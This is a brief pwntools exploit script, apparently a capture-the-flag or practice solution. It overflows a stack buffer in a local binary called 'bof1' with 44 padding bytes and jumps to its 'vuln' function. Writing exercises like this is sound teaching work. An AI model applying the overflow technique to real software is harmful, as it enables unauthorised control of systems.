from pwn import *
context(os='linux', arch='i386')

filename='bof1'
p = process("./"+filename)
elf=ELF(filename)

vuln=elf.functions['vuln'].address

payload=''
payload+='A'*44
payload+=p32(vuln)

p.sendline(payload)

p.interactive()


